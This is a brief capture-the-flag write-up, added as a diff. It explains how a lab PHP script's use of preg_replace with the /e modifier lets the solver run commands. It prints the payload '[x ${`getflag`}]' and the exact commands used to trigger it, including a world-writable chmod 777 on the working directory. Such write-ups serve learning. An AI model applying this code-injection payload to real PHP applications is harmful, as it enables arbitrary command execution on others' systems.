@@ -1,0 +1,6 @@
+We saw a php and an executable. When we looked into the php file we saw calls to preg_replace that is known to have an exploit with /e.
+We also saw a call to get_file_contents to the first arg. 
+Since the regex in the preg_replace function was like this 'preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)"',
+we needed to have a string in the file with this format '[x mycommand]'.
+Then we used brackets to evaluate the string and backticks to execute it like so '[x ${`getflag`}]
+Finally we did chmod 777 . to create a file in the current dir and echo '[x ${`getflag`}]' > exploit; php level06.php exploit
